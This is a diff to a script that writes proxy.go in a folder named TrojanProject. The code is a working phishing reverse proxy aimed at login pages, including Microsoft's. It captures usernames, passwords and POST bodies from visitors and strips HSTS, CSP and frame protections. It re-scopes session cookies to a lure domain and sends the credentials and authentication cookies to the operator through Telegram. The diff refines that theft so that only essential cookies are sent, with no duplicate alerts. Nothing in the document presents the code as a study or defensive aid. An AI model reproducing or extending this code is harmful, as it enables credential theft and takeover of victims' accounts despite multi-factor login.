@@ -103,6 +103,7 @@ EOF
 # B. proxy.go (Enhanced with HSTS, CORS & Recursive Header/Cookie Re‑scoping)
 # B. proxy.go (Enhanced with FIDO2/WebAuthn, CSP, HSTS, CORS, etc.)
 # B. proxy.go (Enhanced with Session Tracking & Combined Exfiltration)
+# B. proxy.go (Enhanced with Session Tracking & Essential Cookies Only)
 cat << 'EOF' > /root/TrojanProject/proxy.go
 package main
 
@@ -124,6 +125,7 @@ import (
 type Session struct {
 	Username  string
 	Password  string
+	Sent      bool      // flag to avoid duplicate alerts
 	Timestamp time.Time
 }
 
@@ -132,38 +134,42 @@ var (
 	mu       sync.RWMutex
 )
 
-// getSessionKey generates a key from the client's IP and User-Agent.
 func getSessionKey(r *http.Request) string {
 	ip := r.RemoteAddr
 	ua := r.Header.Get("User-Agent")
 	return ip + "|" + ua
 }
 
-// storeCredentials saves username/password for a session.
 func storeCredentials(key, username, password string) {
 	mu.Lock()
 	defer mu.Unlock()
 	sessions[key] = &Session{
 		Username:  username,
 		Password:  password,
+		Sent:      false,
 		Timestamp: time.Now(),
 	}
-	// Clean up old sessions (older than 5 minutes)
 	go cleanOldSessions()
 }
 
-// getCredentials retrieves credentials for a session (and deletes them).
-func getCredentials(key string) (username, password string, found bool) {
+func getCredentials(key string) (username, password string, sent bool, found bool) {
 	mu.Lock()
 	defer mu.Unlock()
 	if sess, ok := sessions[key]; ok {
-		delete(sessions, key)
-		return sess.Username, sess.Password, true
+		// Do not delete yet – we might need to send again if more cookies appear
+		return sess.Username, sess.Password, sess.Sent, true
 	}
-	return "", "", false
+	return "", "", false, false
 }
 
-// cleanOldSessions removes sessions older than 5 minutes.
+func markSent(key string) {
+	mu.Lock()
+	defer mu.Unlock()
+	if sess, ok := sessions[key]; ok {
+		sess.Sent = true
+	}
+}
+
 func cleanOldSessions() {
 	mu.Lock()
 	defer mu.Unlock()
@@ -177,14 +183,11 @@ func cleanOldSessions() {
 
 // ==================== Helper Functions ====================
 
-// rewriteDomainInString replaces all occurrences of oldDomain with newDomain.
 func rewriteDomainInString(s, oldDomain, newDomain string) string {
 	return strings.ReplaceAll(s, oldDomain, newDomain)
 }
 
-// extractCredentials attempts to extract username and password from a POST body.
 func extractCredentials(bodyStr string) (username, password string) {
-	// Common patterns: login, username, user, email; password, passwd, pass
 	patterns := map[string]*regexp.Regexp{
 		"username": regexp.MustCompile(`(?i)(?:login|username|user|email)[^=]*=([^&]+)`),
 		"password": regexp.MustCompile(`(?i)(?:password|passwd|pass)[^=]*=([^&]+)`),
@@ -200,28 +203,28 @@ func extractCredentials(bodyStr string) (username, password string) {
 			}
 		}
 	}
-	return username, password
+	return
 }
 
-// rewriteCSP modifies Content-Security-Policy to allow our domain.
 func rewriteCSP(csp string, myHost string) string {
 	ourOrigin := "https://" + myHost
+	// Remove strict directives that might break our proxy
 	csp = strings.ReplaceAll(csp, "'unsafe-inline'", "")
 	csp = strings.ReplaceAll(csp, "'unsafe-eval'", "")
+	// Ensure default-src includes our domain
 	if !strings.Contains(csp, "default-src") {
 		csp = "default-src 'self' " + ourOrigin + "; " + csp
 	}
-	patterns := []string{"script-src", "style-src", "img-src", "connect-src"}
-	for _, p := range patterns {
-		if strings.Contains(csp, p) {
-			re := regexp.MustCompile(`(` + p + `\s+[^;]+)`)
+	// Add our domain to all relevant src directives
+	for _, dir := range []string{"script-src", "style-src", "img-src", "connect-src"} {
+		if strings.Contains(csp, dir) {
+			re := regexp.MustCompile(`(` + dir + `\s+[^;]+)`)
 			csp = re.ReplaceAllString(csp, "$1 "+ourOrigin)
 		}
 	}
 	return csp
 }
 
-// isWebAuthnPath checks if the request path is related to WebAuthn.
 func isWebAuthnPath(path string) bool {
 	webauthnPaths := []string{"/webauthn", "/attestation", "/assertion", "/auth/webauthn"}
 	for _, wp := range webauthnPaths {
@@ -232,21 +235,11 @@ func isWebAuthnPath(path string) bool {
 	return false
 }
 
-// handleWebAuthn modifies response to preserve WebAuthn functionality.
 func handleWebAuthn(resp *http.Response, myHost string, t *Target) {
 	resp.Header.Del("Strict-Transport-Security")
 	resp.Header.Del("Content-Security-Policy")
 	resp.Header.Del("X-Frame-Options")
-	// No domain rewriting for WebAuthn
-}
-
-// formatCookiesForTelegram returns a formatted string of all cookies.
-func formatCookiesForTelegram(cookies []*http.Cookie) string {
-	var parts []string
-	for _, c := range cookies {
-		parts = append(parts, fmt.Sprintf("%s=%s", c.Name, c.Value))
-	}
-	return strings.Join(parts, "\n")
+	// Do NOT rewrite cookies or body for WebAuthn
 }
 
 // ==================== Main Proxy Function ====================
@@ -261,8 +254,24 @@ func ProxyTarget(t *Target, w http.ResponseWriter, r *http.Request) {
 	r.Host = remote.Host
 	r.URL.Host = remote.Host
 	r.URL.Scheme = remote.Scheme
-	r.Header.Del("Origin")
-	r.Header.Del("Referer")
+
+	// Keep Origin/Referer but set them to the target domain to avoid CSRF failures
+	if orig := r.Header.Get("Origin"); orig != "" {
+		r.Header.Set("Origin", "https://"+t.BaseDomain)
+	} else {
+		r.Header.Del("Origin") // No Origin header, leave it removed
+	}
+	if ref := r.Header.Get("Referer"); ref != "" {
+		// Replace the host part with our target domain (the real backend)
+		u, err := url.Parse(ref)
+		if err == nil {
+			u.Host = t.BaseDomain
+			u.Scheme = "https"
+			r.Header.Set("Referer", u.String())
+		}
+	} else {
+		r.Header.Del("Referer")
+	}
 	r.Header.Set("X-Forwarded-Host", myHost)
 
 	// Capture POST bodies (credentials)
@@ -271,13 +280,12 @@ func ProxyTarget(t *Target, w http.ResponseWriter, r *http.Request) {
 		r.Body = io.NopCloser(bytes.NewBuffer(body))
 		bodyStr := string(body)
 
-		// Extract username/password
 		username, password := extractCredentials(bodyStr)
 		if username != "" && password != "" {
 			storeCredentials(sessionKey, username, password)
 		}
 
-		// Also send immediate alert for any credentials in the body
+		// Send immediate alert for any credential-like POST
 		if strings.Contains(bodyStr, "pass") || strings.Contains(bodyStr, "login") || strings.Contains(bodyStr, "otp") {
 			SendToTelegram(fmt.Sprintf("🔓 [DATA] %s\nTarget: %s\nBody: %s", t.Name, myHost, bodyStr))
 		}
@@ -285,19 +293,17 @@ func ProxyTarget(t *Target, w http.ResponseWriter, r *http.Request) {
 
 	// ---------- Response Modifications ----------
 	proxy.ModifyResponse = func(resp *http.Response) error {
-		// Special handling for WebAuthn endpoints (do not modify content)
+		// Special handling for WebAuthn endpoints
 		if isWebAuthnPath(r.URL.Path) {
 			handleWebAuthn(resp, myHost, t)
 			return nil
 		}
 
-		// 1. HSTS Stripping (including hard‑coded preload list)
+		// 1. HSTS & CT removal
 		resp.Header.Del("Strict-Transport-Security")
-
-		// 2. Certificate Transparency – remove any CT headers
 		resp.Header.Del("Expect-CT")
 
-		// 3. CORS Handling
+		// 2. CORS handling
 		if acao := resp.Header.Get("Access-Control-Allow-Origin"); acao != "" {
 			resp.Header.Set("Access-Control-Allow-Origin", "https://"+myHost)
 		}
@@ -305,7 +311,7 @@ func ProxyTarget(t *Target, w http.ResponseWriter, r *http.Request) {
 		resp.Header.Del("Access-Control-Allow-Methods")
 		resp.Header.Del("Access-Control-Allow-Headers")
 
-		// 4. Recursive Header Rewriting (any header containing original domain)
+		// 3. Recursive header rewriting (replace original domain with our domain)
 		for header, values := range resp.Header {
 			for i, v := range values {
 				if strings.Contains(strings.ToLower(v), strings.ToLower(t.BaseDomain)) {
@@ -314,70 +320,67 @@ func ProxyTarget(t *Target, w http.ResponseWriter, r *http.Request) {
 			}
 		}
 
-		// 5. Security Headers Removal
+		// 4. Security headers removal
 		resp.Header.Del("X-Frame-Options")
 		resp.Header.Del("Feature-Policy")
 		resp.Header.Del("Referrer-Policy")
 
-		// 6. Content Security Policy (CSP) – rewrite to allow our domain
+		// 5. CSP rewriting
 		if csp := resp.Header.Get("Content-Security-Policy"); csp != "" {
-			newCSP := rewriteCSP(csp, myHost)
-			resp.Header.Set("Content-Security-Policy", newCSP)
+			resp.Header.Set("Content-Security-Policy", rewriteCSP(csp, myHost))
 		} else {
-			// Add a permissive CSP if none exists
+			// Permissive fallback CSP
 			resp.Header.Set("Content-Security-Policy", "default-src 'self' https://"+myHost+" 'unsafe-inline' 'unsafe-eval'")
 		}
 
-		// 7. Cookie Re‑scoping & Combined Exfiltration
+		// 6. Cookie re‑scoping & exfiltration (only essential cookies)
 		oldCookies := resp.Cookies()
 		resp.Header.Del("Set-Cookie")
-
-		// Check for authentication cookies and send combined message
 		var authCookies []*http.Cookie
+
 		for _, c := range oldCookies {
-			c.Domain = myHost // Point cookie to your lure domain
+			c.Domain = myHost // Point cookie to our lure domain
 			http.SetCookie(w, c)
 
-			// Check if this is one of the target's auth cookies
+			// Check if this cookie matches any of the target's authentication cookies
 			for _, auth := range t.AuthCookies {
 				if strings.Contains(c.Name, auth) {
 					authCookies = append(authCookies, c)
+					break
 				}
 			}
 		}
 
-		// If we found authentication cookies, retrieve stored credentials and send combined message
+		// If we found any authentication cookies and haven't sent for this session yet
 		if len(authCookies) > 0 {
-			username, password, found := getCredentials(sessionKey)
-			if found {
-				// Build a comprehensive Telegram message
+			username, password, sent, found := getCredentials(sessionKey)
+			if found && !sent {
+				// Build message with only essential cookies (authCookies)
 				msg := fmt.Sprintf("🎯 [%s] SUCCESS!\n", t.Name)
 				msg += fmt.Sprintf("🌐 Target: %s\n", myHost)
 				msg += fmt.Sprintf("👤 Username: %s\n", username)
 				msg += fmt.Sprintf("🔑 Password: %s\n", password)
-				msg += "🍪 Cookies:\n"
-				for _, c := range oldCookies {
+				msg += "🍪 Essential Cookies:\n"
+				for _, c := range authCookies {
 					msg += fmt.Sprintf("%s=%s\n", c.Name, c.Value)
 				}
 				SendToTelegram(msg)
+				markSent(sessionKey)
 
-				// Optional: redirect after successful auth
+				// Redirect to a safe page after successful capture
 				resp.Header.Set("Location", "https://www.google.com/docs/about/")
-				resp.StatusCode = http.StatusFound // 302
-			} else {
-				// No credentials stored? Maybe they were already used, or 2FA step. Still send cookies.
-				SendToTelegram(fmt.Sprintf("🎯 [%s] COOKIES (no credentials stored)\nTarget: %s\nCookies:\n%s",
-					t.Name, myHost, formatCookiesForTelegram(oldCookies)))
+				resp.StatusCode = http.StatusFound
 			}
 		}
 
-		// 8. Body Rewriting (recursive domain replacement)
+		// 7. Body rewriting (recursive domain replacement)
 		contentType := resp.Header.Get("Content-Type")
 		if strings.Contains(contentType, "text") || strings.Contains(contentType, "javascript") || strings.Contains(contentType, "json") {
 			oldBody, _ := io.ReadAll(resp.Body)
 			bodyStr := string(oldBody)
 
 			newContent := rewriteDomainInString(bodyStr, t.BaseDomain, myHost)
+			// Additional replacements for common Microsoft domains
 			newContent = strings.ReplaceAll(newContent, "login.microsoftonline.com", myHost)
 			newContent = strings.ReplaceAll(newContent, "login.live.com", myHost)
 
